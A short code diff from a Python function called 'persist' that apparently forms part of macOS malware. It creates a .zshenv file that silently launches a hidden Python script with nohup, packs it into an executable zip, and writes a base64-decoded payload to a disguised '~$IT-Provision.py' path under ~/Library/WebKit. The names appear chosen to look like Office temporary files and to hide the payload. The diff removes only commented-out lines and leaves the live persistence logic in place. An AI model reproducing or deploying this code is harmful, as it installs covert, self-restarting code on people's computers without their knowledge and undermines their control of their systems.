@@ -356,23 +356,13 @@ def persist(data):
         prof = """echo "zsh profile error report" > /tmp/~\\$zshprofileerror.txt
         nohup /usr/bin/python ~/Library/WebKit/\~\$IT-Provision.py &"""
 
-        #pfile = open('/Users/%s/Library/WebKit/.zshenv'%uname, 'w')
-        #pfile.write(prof)
-        #pfile.close()
-        #st = os.stat("/Users/%s/Library/WebKit/.zshenv"%uname)
-        #os.chmod("/Users/%s/Library/WebKit/.zshenv"%uname,st.st_mode | 0o111)
-
-
         zf = zipfile.ZipFile('/Users/%s/~$IT-Provision.zip'%uname,mode='w',compression=zipfile.ZIP_DEFLATED)
 
         zf.writestr(".zshenv",prof)
 
-        #zf.write('/Users/%s/Library/WebKit/.zshenv'%uname)
         zf.close()
         st = os.stat("/Users/%s/~$IT-Provision.zip"%uname)
         os.chmod("/Users/%s/~$IT-Provision.zip"%uname,st.st_mode | 0o111)
-
-        #os.remove('/Users/%s/Library/WebKit/.zshenv'%uname)
 
         ofile = open('/Users/%s/Library/WebKit/~$IT-Provision.py'%uname, 'wb')
         datal = base64.b64decode(data)
